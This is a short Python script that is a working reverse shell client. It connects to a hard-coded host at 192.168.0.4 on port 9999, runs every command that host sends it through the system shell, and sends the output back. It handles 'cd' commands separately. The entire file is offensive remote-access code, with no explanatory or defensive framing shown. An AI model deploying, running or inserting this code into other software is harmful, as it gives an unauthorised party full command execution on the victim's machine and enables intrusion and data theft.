import socket
import subprocess
import os

host="192.168.0.4"
port=9999
sock=None

def socket_init():
    global sock
    sock=socket.socket()

def socket_connection():
    global host 
    global port
    global sock
    sock.connect((host,port))

def socket_recv():
    global sock
    while True:
        cmd=sock.recv(1024)
        if cmd[:2].decode()=="cd":
            os.chdir(cmd[3:].decode())
        else:
            result=subprocess.run(cmd.decode(), shell=True,capture_output=True)
            result_str=result.stdout.decode()
            total_str=os.getcwd()+" "+result_str
            sock.send(total_str.encode())



if __name__ == "__main__":
    socket_init()
    socket_connection()
    socket_recv()
    
